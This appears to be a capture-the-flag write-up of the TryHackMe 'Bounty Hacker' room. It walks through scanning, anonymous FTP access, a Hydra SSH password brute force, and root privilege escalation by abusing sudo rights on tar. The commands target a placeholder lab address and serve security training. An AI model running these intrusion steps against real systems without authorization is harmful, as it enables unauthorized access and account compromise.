# TryHackMe — Bounty Hacker Write-Up

This write-up documents the complete compromise of the **Bounty Hacker** room on TryHackMe, covering reconnaissance, enumeration, initial access, and privilege escalation.

---

## Reconnaissance

Start with a service and version scan:

```bash
nmap -sC -sV <ip>
```

The scan reveals three open ports:

- 21 → FTP
- 22 → SSH
- 80 → HTTP

---

## FTP Enumeration

Connect using anonymous login:

```bash
ftp <ip>
```

Press Enter when prompted for credentials.

Inside the FTP server two files are discovered:

- `locks.txt`
- `task.txt`

Download them:

```bash
get task.txt
get locks.txt
```

Inspect locally:

```bash
cat task.txt
cat locks.txt
```

`locks.txt` contains possible passwords which may be useful later.

---

## Web Enumeration

Browse to:

```
http://<ip>
```

The webpage does not expose anything useful.

Directory brute forcing can be attempted:

```bash
gobuster dir -w <wordlist> -u http://<ip>
```

No critical findings are required for exploitation.

---

## SSH Brute Force

Use the password list from `locks.txt` to attack SSH.

Example with Hydra:

```bash
hydra ssh://<ip> -L users.txt -P locks.txt
```

Valid credentials are discovered.

---

## Initial Access

Login through SSH:

```bash
ssh <user>@<ip>
```

After authentication, list files:

```bash
ls
```

Retrieve the user flag:

```bash
cat user.txt
```

---

## Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

The output shows that the user can run `tar` with elevated privileges.

Using the GTFOBins technique for `tar`, spawn a root shell:

```
https://gtfobins.github.io/gtfobins/tar/
```

This provides root access.

---

## Root Access

Read the final flag:

```bash
cat /root/root.txt
```

---

## Summary

| Phase | Result |
|--------|-----------|
Scanning | FTP, SSH, HTTP discovered |
FTP | Password list obtained |
SSH | Credentials brute-forced |
User | Shell access obtained |
Privilege Escalation | `tar` abused via sudo |
Root | Root flag captured |

---

## Notes

This lab demonstrates:

- Importance of checking anonymous FTP
- Credential reuse and weak passwords
- Basic brute force attacks
- Exploiting misconfigured sudo permissions
